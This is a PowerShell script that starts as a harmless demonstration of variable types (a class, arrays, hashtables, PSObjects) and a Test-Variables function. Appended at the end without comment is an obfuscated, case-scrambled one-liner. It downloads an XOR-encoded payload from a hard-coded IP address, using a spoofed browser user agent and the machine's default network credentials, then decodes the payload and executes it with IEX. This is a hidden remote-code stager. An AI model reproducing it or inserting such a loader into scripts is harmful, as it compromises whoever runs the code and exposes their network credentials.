class MyClass {
	[String] $Name;
	[Int32] $Number; }
[bool]$scriptBool = $false
$scriptInt = 42
function Test-Variables {
    $strVar = "Hello"
	[string]$strVar2 = "Hello2"
	$arrVar = @(1, 2, $strVar, $objVar)
	$assocArrVar = @{ firstChild = "Child"; secondChild = 42 }
	$classVar = [MyClass]::new();
	$classVar.Name = "Test"
	$classVar.Number = 42;
    $enumVar = $ErrorActionPreference
    $psObjVar = New-Object -TypeName PSObject -Property @{Name = 'John';  Age = 75}
    $psCustomObjVar = [PSCustomObject] @{Name = 'Paul'; Age = 73}
    $procVar = Get-Process system
	Write-Output "Done"
}

Test-Variables

$wC=NeW-OBJEct SYStEM.NET.WEBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRs.Add('User-Agent',$u);$wC.PrOxy = [SySTem.NET.WeBReQuest]::DeFAULtWEbProXy;$wc.ProxY.CREdENTiALS = [SYstEM.NeT.CRedentIalCAChe]::DEFauLtNEtworkCredeNtialS;$K='VNMkZc{S;gAe_fD8u:4xLX-Ciw^U,Br<';$i=0;[chAr[]]$b=([ChaR[]]($WC.DoWnloaDSTrING("http://52.196.119.113:80/index.asp")))|%{$_-BXor$k[$I++%$K.LENGtH]};IEX ($B-join'')

